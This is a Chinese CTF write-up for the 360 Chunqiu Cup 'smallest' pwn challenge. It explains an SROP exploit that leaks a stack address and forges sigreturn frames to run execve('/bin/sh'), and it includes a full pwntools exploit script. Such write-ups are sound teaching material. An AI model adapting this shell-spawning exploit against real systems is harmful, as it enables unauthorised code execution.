## 360 春秋杯 smallest-pwn

### 基本情况

只有几行汇编，通过系统调用号 0 调用 read 向 buf 写入 0x400 字节，造成栈溢出。

直观可以看到一个 gadget ：``syscall;ret;`` ，这是 srop 非常典型的 gadget 。

### 思路

由于程序中并没有 sigreturn 调用，所以我们得自己构造，正好这里有 read 函数调用，所以我们可以通过 read 函数读取的字节数来设置 rax 的值。重要思路如下

- 通过控制 read 读取的字符数来设置 RAX 寄存器的值，从而执行 sigreturn
- 通过 syscall 执行 execve("/bin/sh",0,0) 来获取 shell。

基本流程为

- 读取三个程序起始地址
- 程序返回时，利用第一个程序起始地址读取地址，修改返回地址 (即第二个程序起始地址) 为源程序的第二条指令，并且会设置 rax=1
- 那么此时将会执行 write(1,$esp,0x400)，泄露栈地址。
- 利用第三个程序起始地址进而读入 payload
- 再次读取构造 sigreturn 调用，进而将向栈地址所在位置读入数据，构造 execve('/bin/sh',0,0)
- 再次读取构造 sigreturn 调用，从而获取 shell。

#### step 0

溢出写入 3 个程序起始地址（start_addr），用于 step012 结束后返回程序开始位置。

```python
# ==step0==
payload = p64(start_addr) * 3	#step012
p.send(payload)
```

#### step 1

首先是要写入 1 字节，让 rax 变成 1 （write 系统调用号）。然后是需要修改跳转地址到 ``0x4000B3`` 绕开 xor ，保持 rax 的值，刚好写入指针指向的是 step 1 的返回地址，step 0 提前布置写入了 start_addr ，这里刚好覆盖最后一字节。

```python
# ==step1==
## modify the return addr to start_addr+3
## so that skip the xor rax,rax; then the rax=1
p.send('\xb3')	# 第二个start_addr
				# 写入一个字节，让rax变成1，也就是系统调用号1 write
				# 同时这个是覆盖写入第二个start_addr最低字节，直接控制跳转0x4000B3保存rax的值
```

#### step 2

接收地址，正常跳转回 start_addr 

```python
# ==step2==
stack_addr = u64(p.recv()[8:16])	# 接受rsp下一个内存块中的栈地址
									# 第三个start_addr
log.success('leak stack addr :' + hex(stack_addr))
```

#### step 3

写入伪造的 SigreturnFrame 。写入的指针又是当前栈的返回地址，所以 payload 先填入返回地址 start_addr 。然后用 8 字节填充之后再写入 SigreturnFrame ，ROP 之后 rsp 会向高地址抬 8 个字节（指向这 8 个字节所在的地址），空出来放 step 4 的 syscall_ret 。sigframe 不去除前 8 字节的 rt_signalret 是留空间给 step 4 用作填充空间。

```python
# ==step3==
## make the rsp point to stack_addr
## the frame is read(0,stack_addr,0x400)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
payload = p64(start_addr) + 'a' * 8 + str(sigframe)	# start_addr改写自己返回地址
p.send(payload)
```

#### step 4

syscall_ret 填充 'a'*8 ，\x00 填充 rt_sigreturn  。用 syscall_ret 主动恢复内存状态，就不需要用到 re_sigreturn 被动调用恢复内存状态。（这点是我根据其他类似题目 wp 中 str(sigframe[8:]) ，signal 栈帧前面是主动的 syscall(15) 调用  rt_signreturn ，就不需要 signal 栈帧中的 rt_signreturn 被动调用）

```python
# ==step4==
## set rax=15 and call sigreturn、
sigreturn = p64(syscall_ret) + '\x00' * 7	# 覆盖rt_sigreturn;填充15字节
											# 修改返回地址到syscall ret
p.send(sigreturn)
```

#### step 5

和 step 3 一样写入 signal 栈帧，这里写入的是 execve 的。

```python
# ==step5==
## call execv("/bin/sh",0,0)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

frame_payload = p64(start_addr) + '\x00' * 8 + str(sigframe)	#start_addr 改写自己返回地址
print len(frame_payload)
payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'
p.send(payload)
```

#### step 6

与 step 4 一样主动调用 rt_sigreturn 恢复内存状态。

```python
# ==step6==
p.send(sigreturn)	# 调用syscall
p.interactive()
```

### EXP

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context(log_level='debug',arch='amd64')

p = process('./smallest')
small = ELF('./smallest')


syscall_ret = 0x00000000004000BE
start_addr = 0x00000000004000B0

# ==step0==
payload = p64(start_addr) * 3	#step012
p.send(payload)	#第一个start_addr

# ==step1==
## modify the return addr to start_addr+3
## so that skip the xor rax,rax; then the rax=1
p.send('\xb3')	# 第二个start_addr
				# 写入一个字节，让rax变成1，也就是系统调用号1 write
				# 同时这个是覆盖写入第二个start_addr最低字节，直接控制跳转0x4000B3保存rax的值
# ==step2==
stack_addr = u64(p.recv()[8:16])	# 接受rsp下一个内存块中的栈地址
									# 第三个start_addr
log.success('leak stack addr :' + hex(stack_addr))

# ==step3==
## make the rsp point to stack_addr
## the frame is read(0,stack_addr,0x400)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
payload = p64(start_addr) + 'a' * 8 + str(sigframe)	#start_addr 改写自己返回地址
p.send(payload)

# ==step4==
## set rax=15 and call sigreturn、
sigreturn = p64(syscall_ret) + '\x00' * 7	# 覆盖rt_sigreturn;填充15字节
											# 修改返回地址到syscall ret
p.send(sigreturn)

# ==step5==
## call execv("/bin/sh",0,0)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

frame_payload = p64(start_addr) + '\x00' * 8 + str(sigframe)	#start_addr 改写自己返回地址
print len(frame_payload)
payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'
p.send(payload)
## ==step6==
p.send(sigreturn)	# 调用syscall
p.interactive()
```

### 参考文章

* [2017 429 ichunqiu ctf smallest(pwn300) writeup](https://blog.csdn.net/qq_29343201/article/details/72627439)
* [ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#_11)